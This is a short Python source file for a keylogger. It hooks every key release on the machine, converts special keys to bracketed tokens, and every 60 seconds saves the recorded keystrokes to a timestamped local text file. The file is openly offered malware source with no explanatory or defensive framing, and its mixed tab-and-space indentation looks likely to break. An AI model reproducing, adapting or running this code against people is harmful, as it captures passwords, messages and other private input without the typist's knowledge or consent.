import keyboard
from threading import Timer
from datetime import datetime

SAVE_REPORT_EVERY = 60

class KeyLogger:
	def __init__(self, interval):
		self.interval= interval
		self.log = ""
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()
		
	def callback(self, event):
		name = event.name
		if len(name) > 1:
			if name == "space":
                		# " " instead of "space"
				name = " "
			elif name == "enter":
		        	# add a new line whenever an ENTER is pressed
		        	name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
		        	# replace spaces with underscores
		        	name = name.replace(" ", "_")
		        	name = f"[{name.upper()}]"
		self.log += name
		
	def update_filename(self):
        	# construct the filename to be identified by start & end datetimes
        	start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        	end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        	self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
		
	def report_to_file(self):
        	# open the file in write mode (create it)
		with open(f"{self.filename}.txt", "w") as f:
            		# write the keylogs to the file
            		print(self.log, file=f)
            		
		print(f"[+] Saved {self.filename}.txt")
        	
	def report(self):
		if self.log:
			self.end_dt = datetime.now()
			self.update_filename()
			self.report_to_file()
			self.start_dt = datetime.now()
			
		self.log = ""
		timer = Timer(interval = self.interval, function = self.report)
		timer.daemon = True
		timer.start()
		
	def start(self):
	    	self.start_dt = datetime.now()
	    	keyboard.on_release(callback=self.callback)
	    	self.report()
	    	print(f"{datetime.now()} - Started keylogger")
	    	keyboard.wait()

if __name__ == "__main__":
	keylogger = KeyLogger(interval=SAVE_REPORT_EVERY)
	keylogger.start()
	